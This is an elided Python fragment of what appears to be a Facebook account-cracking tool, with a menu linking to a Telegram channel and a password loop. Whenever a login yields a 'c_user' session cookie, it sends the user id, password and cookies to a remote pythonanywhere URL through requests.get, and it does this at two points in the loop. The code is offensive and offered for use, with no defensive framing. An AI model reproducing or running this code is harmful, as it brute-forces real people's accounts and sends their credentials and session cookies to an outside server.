...
def menu():
    ...
    elif devv =='5':os.system("xdg-open https://t.me/Ariff_attackermen_Frome_lautan");menu()
    elif devv =='6':exit()
    else:
    ...
    try:
        ...
        for ps in pwx:
            ...
            if "c_user" in log_cookies:
                ...
                requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={uid}|{pw}|{coki}")
                ...
                if "live" in check_lock(cid):
                    if '%3A-1%3A-1' in coki:
                        ...
                        if "yes" in cookie_show:
                            ...
                            requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={cid}|{ps}|{coki}")
